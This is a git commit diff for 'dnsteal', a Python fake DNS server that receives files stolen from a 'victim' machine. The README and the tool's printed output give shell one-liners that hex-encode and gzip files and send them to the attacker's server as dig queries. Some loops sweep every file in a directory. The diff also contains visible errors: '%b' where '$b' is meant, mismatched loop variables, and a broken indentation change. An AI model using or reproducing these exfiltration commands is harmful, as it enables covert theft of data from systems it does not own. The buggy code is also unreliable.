0e12d2539ae0f3dbae5487ef19597d9d62523c65
Mitch <m0x3957@gmail.com>
2015-09-27 15:39:19 +0200

    1.0: Added support for multiple files per Github issue: feature request. Also other little things here and there.

--- README.md
+++ README.md
@@ -4,13 +4,21 @@ This is a fake DNS server that allows you to stealthily extract files from a vic
 
 Below is an image showing an example of how to use:
 
-![Alt text](https://github.com/m57/dnsteal/blob/master/dns-exfil.PNG)
+![Alt text](https://slimgr.com/images/2015/09/27/d7cb61e9105e62f70e2b866b6be55885.png)
 
 On the victim machine, you simply can do something like so:
 
 ```bash
-for b in $(xxd -p file/to/send.png); do dig @server $b.fakedomain.com; done
+for b in $(xxd -p file/to/send.png); do dig @server $b.filename.com; done
 ```
+
+**Support for multiple files**
+
+```bash
+for filename in $(ls); do for b in $(xxd -p $f); do dig +short @server %b.$filename.com; done; done
+```
+
+**gzip compression supported**
 
 It also supports compression of the file to allow for faster transfer speeds, this can be achieved using the "-z" switch:
 
@@ -21,7 +29,13 @@ python dnsteal.py 127.0.0.1 -z
 Then on the victim machine send a Gzipped file like so:
 
 ```bash
-for b in $(gzip -c file/to/send.png | xxd -p); do dig @program.ninja $b.domain.com; done
+for b in $(gzip -c file/to/send.png | xxd -p); do dig @server $b.filename.com; done
+```
+
+or for multiple, gzip compressed files:
+
+```bash
+for filename in $(ls); do for b in $(gzip -c $filename | xxd -p); do dig +short @server %b.$filename.com; done; done
 ```
 
 ~x90
--- dnsteal.py
+++ dnsteal.py
@@ -1,5 +1,6 @@
 #!/usr/bin/env python
-#####################
+#  ~ \x90
+######################
 
 import socket
 import sys
@@ -8,57 +9,62 @@ import time
 import random
 import hashlib
 import zlib
+
+c = { "r" : "\033[1;31m", "g": "\033[1;32m", "y" : "\033[1;33m", "e" : "\033[0m" }
+VERSION = "1.0"
 	
 class DNSQuery:
-  def __init__(self, data):
-    self.data = data
-    self.data_text = ''
+	def __init__(self, data):
+		self.data = data
+		self.data_text = ''
 
-    tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
-    if tipo == 0:                     # Standard query
-      ini=12
-      lon=ord(data[ini])
-      while lon != 0:
-        self.data_text += data[ini+1:ini+lon+1]+'.'
-        ini += lon+1
-        lon=ord(data[ini])
+		tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
+		if tipo == 0:                     # Standard query
+			ini=12
+			lon=ord(data[ini])
+		while lon != 0:
+			self.data_text += data[ini+1:ini+lon+1]+'.'
+			ini += lon+1
+			lon=ord(data[ini])
 
-  def request(self, ip):
-    packet=''
-    if self.data_text:
-      packet+=self.data[:2] + "\x81\x80"
-      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
-      packet+=self.data[12:]                                         # Original Domain Name Question
-      packet+='\xc0\x0c'                                             # Pointer to domain name
-      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
-      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
-    return packet
+	def request(self, ip):
+		packet=''
+		if self.data_text:
+			packet+=self.data[:2] + "\x81\x80"
+			packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
+			packet+=self.data[12:]                                         # Original Domain Name Question
+			packet+='\xc0\x0c'                                             # Pointer to domain name
+			packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
+			packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
+		return packet
 
-def save_to_file(data, file_seed, z):
+def save_to_file(r_data, z):
+	print "\n"
+	for key,value in r_data.iteritems():
 
-	fname = "recieved_%s.bin" % file_seed 
-	flatdata = ""
+		fname = "recieved_%s" % key 
+		flatdata = ""
 
-	for block in data:
-		flatdata += block
+		for block in value:
+			flatdata += block
 
-	if (z):
-	        print "\033[1;32m[!] Unzipping data.\033[0m"
-		x = zlib.decompressobj(16+zlib.MAX_WBITS)
-		flatdata = x.decompress(binascii.unhexlify(flatdata))	
+		if (z):
+		        print "%s[ Info ]%s Unzipping data." % (c["y"], c["e"])
+			x = zlib.decompressobj(16+zlib.MAX_WBITS)
+			flatdata = x.decompress(binascii.unhexlify(flatdata))	
 
-        print "\033[1;32m[!] Saving recieved bytes to ./%s\033[0m" % (fname)
+	        print "%s[ Info ]%s Saving recieved bytes to './%s'" % (c["y"], c["e"], fname)
 
-	f = open(fname, "wb")
+		f = open(fname, "wb")
 	
-	if (z):
-		f.write(flatdata)
-	else:
-		f.write(binascii.unhexlify(flatdata))
+		if (z):
+			f.write(flatdata)
+		else:
+			f.write(binascii.unhexlify(flatdata))
 	
-	f.close()
+		f.close()
 
-	print "\033[1;32m[?] md5sum:\033[0m \033[1;31m%s\033[0m" % (hashlib.md5(open(fname, "r").read()).hexdigest())
+		print "%s[md5sum]%s '%s'" % (c["g"], c["e"], hashlib.md5(open(fname, "r").read()).hexdigest())
 
 
 def banner():
@@ -68,58 +74,57 @@ def banner():
       ___  _  _ ___ _            _ 
      |   \| \| / __| |_ ___ __ _| |
      | |) | .` \__ \  _/ -_) _` | |
-     |___/|_|\_|___/\__\___\__,_|_|
+     |___/|_|\_|___/\__\___\__,_|_|v%s
 
 -- https://github.com/m57/dnsteal.git --\033[0m
 
 Stealthy file extraction via DNS requests
-"""
+""" % VERSION
 
-	
 if __name__ == '__main__':
 
-  z = False
+	z = False
 
-  try:
+	try:
+		ip = sys.argv[1]
+		if "-z" in sys.argv:
+			z = True
+	except:
 
-    ip = sys.argv[1]
-    if "-z" in sys.argv:
-	z = True
-  except:
+		banner()
+		print "Usage: python %s [listen_address] [-z (optional: unzip incoming data)]" % sys.argv[0]
+		exit(1)
 
-    banner()
-    print "Usage: %s [listen_address] [-z (optional: unzip incoming data)]"
-    exit(1)
+	banner()
+	udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	udp.bind((ip,53))
 
-  banner()
-  udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-  udp.bind((ip,53))
-
-  print '\033[1;32m[+]\033[0m DNS listening on %s:53' % ip
-  print "\033[1;32m[+]\033[0m Now on the victim machine, use the following command:"
-  print "\033[1;31m[#]\033[0m for b in $(xxd -p /path/to/file); do dig +short @%s $b.domain.com\nor" % ip
-  print "\033[1;31m[#]\033[0m for b in $(gzip -c /path/to/file | xxd -p); do dig +short @%s $b.domain.com\n" % ip
-  print "\033[1;32m[+]\033[0m Once file has sent, use Ctrl+C to exit and save.\n"
+	print "%s[+]%s DNS listening on '%s:53'" % (c["g"], c["e"], ip)
+	print "%s[+]%s Now on the victim machine, use any of the following commands (or similar):" % (c["y"], c["e"])
+	print "\t%s[\x23]%s for b in $(xxd -p /path/to/file); do dig +short @%s $b.filename.com; done" % (c["r"], c["e"], ip )
+	print "\t%s[\x23]%s for b in $(gzip -c /path/to/file | xxd -p); do dig +short @%s $b.filename.com; done\n" % (c["r"], c["e"], ip)
+	print "\t%s[\x23]%s for f in $(ls *); do for b in $(xxd -p $f); do dig +short @%s $b.$f.com; done; done" % (c["r"], c["e"], ip)
+	print "\t%s[\x23]%s for f in $(ls *); do for b in $(gzip -c $f | xxd -p); do dig +short @%s $b.$f.com; done; done\n" % (c["r"], c["e"], ip)
+	print "%s[+]%s Once files have sent, use Ctrl+C to exit and save.\n" % (c["g"], c["e"])
   
-  file_seed = random.randint(1,32768)
+	file_seed = random.randint(1,32768)
 
-  try:
-
-    fdata = []
-
-    while 1:
+	try:
+		r_data = {}
+		while 1:
       
-      data, addr = udp.recvfrom(1024)
-      p=DNSQuery(data)
-      udp.sendto(p.request(ip), addr)
-      print 'Request: %s -> %s' % (p.data_text, ip)
-      fdata.append(p.data_text.split(".")[0])
+			data, addr = udp.recvfrom(1024)
+			p=DNSQuery(data)
+			udp.sendto(p.request(ip), addr)
+			print 'Request: %s -> %s' % (p.data_text, ip)
 
+			fname = p.data_text.split(".")[1]
+			if fname not in r_data:
+				r_data[fname] = []
 
-  except KeyboardInterrupt:
-
-    save_to_file(fdata, file_seed, z)
-
-    print '\n\033[1;31m[!]\033[0m Closing...'
-
-    udp.close()
+			r_data[fname].append(p.data_text.split(".")[0])
+	
+	except KeyboardInterrupt:
+		save_to_file(r_data, z)
+		print '\n\033[1;31m[!]\033[0m Closing...'
+		udp.close()
